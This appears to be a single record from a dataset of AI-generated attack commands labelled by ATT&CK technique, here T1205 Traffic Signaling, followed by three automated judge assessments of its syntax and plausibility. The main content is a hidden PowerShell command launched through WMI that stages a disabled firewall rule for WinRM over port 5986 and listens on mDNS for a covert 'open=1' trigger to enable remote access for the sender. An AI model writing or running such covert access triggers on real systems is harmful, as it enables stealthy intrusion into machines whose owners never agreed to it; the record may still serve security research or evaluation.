command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(5353); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*._wpad._tcp.local*'' -and $s -like ''*open=1*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -Enabled True -RemoteAddress $ep.Address; break } } }'
explanation: Watches mDNS on UDP/5353 and looks for a query/record referencing '_wpad._tcp.local' with a TXT-like token 'open=1'. This application-specific signal enables a WinRM HTTPS (5986) firewall rule for the requester.
rationale_steps: Create disabled inbound rule for TCP/5986.
Listen on UDP/5353 and inspect the payload for mDNS service and TXT token.
On match, enable the firewall rule and limit to signaling source.

llm_judgments.syntactic_justification: Balanced quoting/braces and valid PowerShell/WMI parameters; the New-Object, UDP receive, and firewall cmdlets are syntactically well-formed within the single-quoted command string.
llm_judgments.semantic_justification: Conceptually fits Traffic Signaling by awaiting an mDNS-based trigger to enable a WinRM rule, but it likely fails operationally without admin rights, proper multicast group join/binding for mDNS, and performs naive ASCII matching on binary DNS data.

llm_judgments.syntactic_justification: The command is largely well-formed with properly nested quotes (doubled single-quotes for PowerShell string escaping within the outer ArgumentList string), balanced braces and parentheses, and valid cmdlet syntax, though the deeply nested quoting layers and WMI ArgumentList string wrapping introduce edge-case parsing fragility.
llm_judgments.semantic_justification: The command accurately implements T1205 Traffic Signaling by listening on mDNS (UDP/5353) for a specific application-layer signal ('_wpad._tcp.local' + 'open=1') to dynamically enable a pre-staged firewall rule allowing WinRM HTTPS (5986) only from the signaling host, which is a textbook port-knocking/traffic-signaling pattern using protocol mimicry (mDNS) to covertly trigger access.

llm_judgments.syntactic_justification: The command is perfectly formed with correct PowerShell syntax, appropriate nesting of script blocks, and properly escaped quotes for the WMI argument list.
llm_judgments.semantic_justification: The command perfectly implements the traffic signaling technique by monitoring mDNS traffic for a specific trigger to dynamically enable a WinRM firewall rule, which is a highly plausible operational use case for T1205.
